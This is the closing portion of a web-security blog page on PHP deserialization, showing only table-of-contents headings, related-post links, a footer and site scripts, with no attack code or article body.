href="#phar%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%A7%A6%E5%8F%91php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.1.4.12.</span> <span class="toc-text"> phar 伪协议触发 php 反序列化</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x10"><span class="toc-number">1.1.4.13.</span> <span class="toc-text"> 0x10</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#joomla-346%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.5.</span> <span class="toc-text"> Joomla  3.4.6 反序列化执行</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
        <ul>
          <li><a href="/2022/02/17/XSS/" rel="bookmark" title="XSS">XSS</a></li><li><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="bookmark" title="SQL injection">SQL injection</a></li><li><a href="/2022/04/16/Upload/" rel="bookmark" title="File upload">File upload</a></li><li class="active"><a href="/2022/04/16/Unserialize/" rel="bookmark" title="反序列化">反序列化</a></li><li><a href="/2022/05/17/include/" rel="bookmark" title="file include">file include</a></li><li><a href="/2022/05/27/CSRF/" rel="bookmark" title="CSRF">CSRF</a></li>
        </ul>
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="John Doe"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">John Doe</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">13</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item categories">
      <a href="/categories/">
        <span class="count">4</span>
        <span class="name">categories</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">5</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2022/04/16/Upload/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2022/11/01/%E6%B1%87%E7%BC%96/" title="汇编">汇编</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E5%86%85%E7%BD%91/" title="In 内网">内网</a>
</div>

    <span><a href="/2022/05/27/emergency%20response/" title="应急响应">应急响应</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/03/16/SQL%E6%B3%A8%E5%85%A5/" title="SQL injection">SQL injection</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/02/17/XSS/" title="XSS">XSS</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E9%80%86%E5%90%91/" title="In 逆向">逆向</a>
</div>

    <span><a href="/2022/11/01/reverse/" title="逆向">逆向</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
</div>

    <span><a href="/2022/10/28/%E7%A7%8B%E6%8B%9B%E9%9D%A2%E8%AF%95%E9%A2%98/" title="秋招面试题">秋招面试题</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/04/16/Unserialize/" title="反序列化">反序列化</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/05/17/include/" title="file include">file include</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
</div>

    <span><a href="/2022/05/27/CSRF/" title="CSRF">CSRF</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2022/04/16/Unserialize/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
